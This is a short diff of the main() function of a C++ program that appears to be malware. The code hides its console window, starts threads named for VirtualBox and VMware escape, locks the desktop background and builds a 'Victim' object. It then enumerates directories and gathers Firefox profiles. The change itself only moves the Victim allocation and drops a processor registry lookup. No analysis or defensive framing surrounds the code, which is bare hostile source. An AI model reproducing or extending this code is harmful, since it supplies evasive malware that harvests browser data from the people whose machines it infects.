@@ -15,13 +15,11 @@ int main(int argc, char* argv[]) {
 	hWindowConsole = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(hWindowConsole, 0);
 #endif
+	Victim* CurrentComputer = new Victim;
 	std::thread virtualBoxChange(VMEscape::virtualBoxEscape);
 	std::thread VMWareBoxChange(VMEscape::VMWareEscape);
 	//Check permissions if we are admin, lock backgroundChange
 	std::thread tBackgroundChange(SCH::LockBackground);
-
-	Victim* CurrentComputer = new Victim;
-	Registers::Key CentralProcessorSubKeys = Registers::RegEnumSubKeys(HKEY_LOCAL_MACHINE, "Hardware\\Description\\System\\CentralProcessor");
 	std::thread t_DirectoriesEnum(&Victim::GetDirectoryList, CurrentComputer);
 	std::thread t_GetFirefoxProfiles(&Victim::GetFirefoxProfiles, CurrentComputer);
 	virtualBoxChange.join();
